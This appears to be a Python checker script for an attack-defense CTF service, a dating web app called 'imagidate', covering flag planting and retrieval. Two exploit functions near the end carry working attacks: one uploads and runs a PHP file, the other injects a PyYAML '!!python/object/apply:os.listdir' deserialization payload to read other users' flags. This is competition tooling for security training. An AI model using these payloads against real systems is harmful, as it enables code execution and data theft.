from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import faker
import secrets
import re
from hashlib import md5
import binascii


from typing import Optional
from logging import LoggerAdapter
from httpx import AsyncClient, Response

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 8080
checker = Enochecker("imagidate", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""
def assert_response(
        logger: LoggerAdapter,
        res : Response,
        matching_text: str,
        errmsg: Optional[str] = None
) -> None:
    if not matching_text in res.text:
        logger.error("Failed"
                     + f"Info: {res.text}")
        if errmsg is None:
            errmsg = f"{res.request.method} {res.request.url.path} failed with {res.text}"
        raise MumbleException(errmsg)

punchlines = [
    "Hi! How's your day going?",
    "What kind of music do you like?",
    "Have you seen any good movies lately?",
    "What's the most interesting book you've read recently?",
    "Do you have any hobbies or interests?",
    "What's your favorite way to spend a weekend?",
    "Have you traveled anywhere exciting recently?",
    "What's your favorite cuisine or dish?",
    "Do you have any pets?",
    "What's the best advice you've ever received?",
    "If you could visit any place in the world, where would it be?",
    "What's a skill you'd like to learn someday?",
    "What's your favorite season of the year and why?",
    "Do you prefer the beach or the mountains?",
    "What's the last TV show you binge-watched?",
    "What's something you're really passionate about?",
    "What's your favorite way to relax after a long day?",
    "What's the most memorable concert or event you've been to?",
    "Do you enjoy cooking or baking? What's your favorite recipe?",
    "If you could have dinner with any three people, dead or alive, who would they be?"
]

"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_db(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
) -> None:
    
    # reguster and login
    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    age = random.randint(20,45)
    gender = secrets.choice(["Male", "Female", "Other"])

    data = {
        "username" : username,
        "password" : password,
        "confirm_password" : password,
        "age" : age,
        "gender" : gender
    }
    register_res = await client.post("/register.php", data=data)
    assert_response(logger,register_res,"Registration successful")

    data = {
        "username" : username,
        "password" : password,
    }
    login_res = await client.post("/login.php", data=data, follow_redirects=True)
    assert_response(logger, login_res, "Profile of")
    
    # find user_id
    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', login_res.text)
    user_id = id_match.group(1)

    # deploy flag
    flag = task.flag
    data = {
        "comment_text" : flag
    }
    putflag_res = await client.post(f"/profile.php?id={user_id}", data=data)
    assert_response(logger, putflag_res, "Comment added successfully")

    await db.set("userdata", (username, password, user_id))
    
    return f"User: {username}" #ID: {user_id}"

@checker.getflag(0)
async def getflag_db(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
) -> None:
    
    try:
        username, password, user_Id = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    data = {"username": username, "password": password}
    login_res = await client.post("/login.php", data=data, follow_redirects=True)
    assert_response(logger, login_res, "Profile of")

    profile_res = await client.get(f"/profile.php?id={user_Id}")
    assert_in(task.flag, profile_res.text, "FLAG NOT FOUND")

@checker.putflag(1)
async def putflag_api(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    
    # reguster and login
    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    age = random.randint(20,45)
    gender = secrets.choice(["Male", "Female", "Other"])

    data = {
        "username" : username,
        "password" : password,
        "confirm_password" : password,
        "age" : age,
        "gender" : gender
    }
    register_res = await client.post("/register.php", data=data)
    assert_response(logger,register_res,"Registration successful")

    data = {
        "username" : username,
        "password" : password,
    }
    login_res = await client.post("/login.php", data=data, follow_redirects=True)
    assert_response(logger, login_res, "Profile of")

    # find user_id
    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', login_res.text)
    user_id = id_match.group(1)

    # deploy flag
    data = {
        "username" : username,
        "age" : age,
        "gender" : gender,
        "requested_username" : secrets.choice(["habibi", "habibti"]),
        "punchline" : secrets.choice(punchlines),
        "custom_filename" : task.flag
    }
    match_res = await client.post("/match.php", data=data)
    assert_response(logger, match_res, "Data sent succesfully")

    await db.set("userdata", (username, password, user_id))
    
    return f"User: {username}"    

@checker.getflag(1)
async def getflag_api(
    task: GetflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,
):
    
    try:
        username, password, user_Id = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    data = {"username": username, "password": password}
    login_res = await client.post("/login.php", data=data, follow_redirects=True)
    assert_response(logger, login_res, "Profile of")

    data = {
        "username" : username
    }
    profile_res = await client.post(f"/check_response.php", data=data)
    output = profile_res.content.replace(b"\\\\", b"\\").decode("unicode-escape")
    assert_in(task.flag.encode().hex(), output, "FLAG NOT FOUND")

#@checker.putnoise(0)
#async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
#    logger.debug(f"Connecting to the service")
#    welcome = await conn.reader.readuntil(b">")
#
#    # First we need to register a user. So let's create some random strings. (Your real checker should use some better usernames or so [i.e., use the "faker¨ lib])
#    username = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#    password = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#    randomNote = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=36)
#    )
#
#    # Register another user
#    await conn.register_user(username, password)
#
#    # Now we need to login
#    await conn.login_user(username, password)
#
#    # Finally, we can post our note!
#    logger.debug(f"Sending command to save a note")
#    conn.writer.write(f"set {randomNote}\n".encode())
#    await conn.writer.drain()
#    await conn.reader.readuntil(b"Note saved! ID is ")
#
#    try:
#        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
#    except Exception as ex:
#        logger.debug(f"Failed to retrieve note: {ex}")
#        raise MumbleException("Could not retrieve NoteId")
#
#    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
#
#    logger.debug(f"{noteId}")
#
#    # Exit!
#    logger.debug(f"Sending exit command")
#    conn.writer.write(f"exit\n".encode())
#    await conn.writer.drain()
#
#    await db.set("userdata", (username, password, noteId, randomNote))
#        
#@checker.getnoise(0)
#async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
#    try:
#        (username, password, noteId, randomNote) = await db.get('userdata')
#    except:
#        raise MumbleException("Putnoise Failed!") 
#
#    logger.debug(f"Connecting to service")
#    welcome = await conn.reader.readuntil(b">")
#
#    # Let's login to the service
#    await conn.login_user(username, password)
#
#    # Let´s obtain our note.
#    logger.debug(f"Sending command to retrieve note: {noteId}")
#    conn.writer.write(f"get {noteId}\n".encode())
#    await conn.writer.drain()
#    data = await conn.reader.readuntil(b">")
#    if not randomNote.encode() in data:
#        raise MumbleException("Resulting flag was found to be incorrect")
#
#    # Exit!
#    logger.debug(f"Sending exit command")
#    conn.writer.write(f"exit\n".encode())
#    await conn.writer.drain()
#
#
#@checker.havoc(0)
#async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#    logger.debug(f"Connecting to service")
#    welcome = await conn.reader.readuntil(b">")
#
#    # In variant 0, we'll check if the help text is available
#    logger.debug(f"Sending help command")
#    conn.writer.write(f"help\n".encode())
#    await conn.writer.drain()
#    helpstr = await conn.reader.readuntil(b">")
#
#    for line in [
#        "This is a notebook service. Commands:",
#        "reg USER PW - Register new account",
#        "log USER PW - Login to account",
#        "set TEXT..... - Set a note",
#        "user  - List all users",
#        "list - List all notes",
#        "exit - Exit!",
#        "dump - Dump the database",
#        "get ID",
#    ]:
#        assert_in(line.encode(), helpstr, "Received incomplete response.")
#
#@checker.havoc(1)
#async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#    logger.debug(f"Connecting to service")
#    welcome = await conn.reader.readuntil(b">")
#
#    # In variant 1, we'll check if the `user` command still works.
#    username = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#    password = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#
#    # Register and login a dummy user
#    await conn.register_user(username, password)
#    await conn.login_user(username, password)
#
#    logger.debug(f"Sending user command")
#    conn.writer.write(f"user\n".encode())
#    await conn.writer.drain()
#    ret = await conn.reader.readuntil(b">")
#    if not b"User 0: " in ret:
#        raise MumbleException("User command does not return any users")
#
#    if username:
#        assert_in(username.encode(), ret, "Flag username not in user output")
#
#    # conn.writer.close()
#    # await conn.writer.wait_closed()
#
#@checker.havoc(2)
#async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
#    logger.debug(f"Connecting to service")
#    welcome = await conn.reader.readuntil(b">")
#
#    # In variant 2, we'll check if the `list` command still works.
#    username = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#    password = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=12)
#    )
#    randomNote = "".join(
#        random.choices(string.ascii_uppercase + string.digits, k=36)
#    )
#
#    # Register and login a dummy user
#    await conn.register_user(username, password)
#    await conn.login_user(username, password)
#
#    logger.debug(f"Sending command to save a note")
#    conn.writer.write(f"set {randomNote}\n".encode())
#    await conn.writer.drain()
#    await conn.reader.readuntil(b"Note saved! ID is ")
#
#    try:
#        noteId = (await conn.reader.readuntil(b"!\n>")).rstrip(b"!\n>").decode()
#    except Exception as ex:
#        logger.debug(f"Failed to retrieve note: {ex}")
#        raise MumbleException("Could not retrieve NoteId")
#
#    assert_equals(len(noteId) > 0, True, message="Empty noteId received")
#
#    logger.debug(f"{noteId}")
#
#    logger.debug(f"Sending list command")
#    conn.writer.write(f"list\n".encode())
#    await conn.writer.drain()
#
#    data = await conn.reader.readuntil(b">")
#    if not noteId.encode() in data:
#        raise MumbleException("List command does not work as intended")
#
@checker.exploit(0)
async def exploit_file_upload(task: ExploitCheckerTaskMessage,
                    searcher: FlagSearcher,
                    client: AsyncClient,
                    logger:LoggerAdapter) -> Optional[str]:
    
    # reguster and login
    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    age = random.randint(20,45)
    gender = secrets.choice(["Male", "Female", "Other"])

    data = {
        "username" : username,
        "password" : password,
        "confirm_password" : password,
        "age" : age,
        "gender" : gender
    }
    register_res = await client.post("/register.php", data=data)
    assert_response(logger,register_res,"Registration successful")

    data = {
        "username" : username,
        "password" : password,
    }
    login_res = await client.post("/login.php", data=data, follow_redirects=True)
    assert_response(logger, login_res, "Profile of")
    
    # find user_id
    id_match = re.search(r'action="/profile\.php\?id=(\d+)"', login_res.text)
    user_id = id_match.group(1)

    # upload exploit
    file = {"image": open("exp.php", "rb")}
    upload_res = await client.post("/upload.php", files=file, follow_redirects=True)
    assert_response(logger, upload_res, "Profile of")

    # trigger exploit
    hashed_username = md5(username.encode()).hexdigest()
    exp_res = await client.get(f"/uploads/{hashed_username}/exp.php")

    if flag := searcher.search_flag(exp_res.text):
            return flag

    raise MumbleException("flag not found")



@checker.exploit(1)
async def exploit_yaml_load(task: ExploitCheckerTaskMessage,
                            searcher: FlagSearcher, 
                            client: AsyncClient,
                            logger:LoggerAdapter) -> Optional[str]:
    
    victim = task.attack_info.split(" ")[1]
    username: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    password: str = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
    age = random.randint(20,45)
    gender = secrets.choice(["Male", "Female", "Other"])

    data = {
        "username" : username,
        "password" : password,
        "confirm_password" : password,
        "age" : age,
        "gender" : gender
    }
    register_res = await client.post("/register.php", data=data)
    assert_response(logger,register_res,"Registration successful")

    data = {
        "username" : username,
        "password" : password,
    }
    login_res = await client.post("/login.php", data=data, follow_redirects=True)
    assert_response(logger, login_res, "Profile of")
    
    hashed_victim = md5(victim.encode()).hexdigest()
    data = {
    "username" : username,
    "age" : age,
    "gender" : gender,
    "requested_username" : secrets.choice(["habibi", "habibti"]),
    "punchline" : f"!!python/object/apply:os.listdir [\"uploads/{hashed_victim}\"]",
    }

    match_res = await client.post("/match.php", data=data)
    assert_response(logger, match_res, "Data sent succesfully")

    data = {
        "username" : username
    }
    check_res = await client.post(f"/check_response.php", data=data)
    flag_pattern = r"- (.+)\.yaml"
    matches = re.findall(flag_pattern, check_res.text)
    
    for match in matches:
        if not match.startswith("data"):
            text = binascii.unhexlify(match).decode("utf-8")
            if flag := searcher.search_flag(text):
                return flag

    raise MumbleException("flag not found")

if __name__ == "__main__":
    checker.run()